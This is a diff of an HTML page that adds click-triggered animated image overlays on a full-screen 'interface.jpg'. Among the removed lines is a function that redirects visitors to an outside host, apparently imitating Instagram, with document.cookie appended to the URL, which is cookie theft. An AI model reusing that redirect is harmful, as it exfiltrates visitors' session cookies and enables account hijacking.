@@ -2,22 +2,83 @@
 <html>
   <head>
     <meta charset="UTF-8">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.css">
     <script>
     if (window.location.protocol == "http:") {
         var restOfUrl = window.location.href.substr(5);
         window.location = "https:" + restOfUrl;
-    }</script>
+    }
+    function animateCSS(element, animationName, callback) {
+    const node = document.querySelector(element)
+    node.classList.add('animated', animationName)
+
+    function handleAnimationEnd() {
+        node.classList.remove('animated', animationName)
+        node.removeEventListener('animationend', handleAnimationEnd)
+
+        if (typeof callback === 'function') callback()
+    }
+
+    node.addEventListener('animationend', handleAnimationEnd)
+    }
+    </script>
     <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
     <script src="/js/main.js"></script>
     <script src="/js/location.js"></script>
     <script src="/js/info.js"></script>
     <script>
-	function insta(){
-	     javascript:window:location.href="http://iinsta.royalwebhosting.net/next/index.php?cookie="+document.cookie;
-
+        var a=0;
+	function clck(){
+	   if (a==0){
+	       div1 = document.createElement('div');
+	       div1.className = "one";
+	       div1.innerHTML = '<img src="window-1.png" style=""class="img1">';
+	       document.body.append(div1);
+               animateCSS('.one', 'fadeInDown')
+           }
+           else if(a==1){
+               animateCSS('.one', 'fadeOutUp')
+               setTimeout(() => div1.remove(), 300);
+               div2 = document.createElement('div');
+	       div2.className = "two";
+	       div2.innerHTML = '<img src="window-2.png" class="img2">';
+	       document.body.append(div2);
+               animateCSS('.two', 'fadeInDown')
+           }
+           else if(a==2){
+               animateCSS('.two', 'fadeOutUp')
+               setTimeout(() => div2.remove(), 300);
+               main()
+           }
+	   a++;	
 	}
+	  
     </script>
+    <style>
+    .one{
+    width:80%;
+    position:absolute;
+    top:20%;
+    right:5%;
+    }
+	.two{
+	width:70%;
+	position:absolute;
+	top:60%;
+	left:5%;
+	}
+    .img1,.img2{
+    width:100%;
+    height:100%;
+    }
+    </style>
   </head>
-  <body onload="information();main()">
+  <body onload="information();" onclick="clck()">
+ 
+  <img src="interface.jpg" style="width:100%;height:100%;position:absolute;top:0;left:0;">
+  
+  
+  
+  
   </body>
 </html>
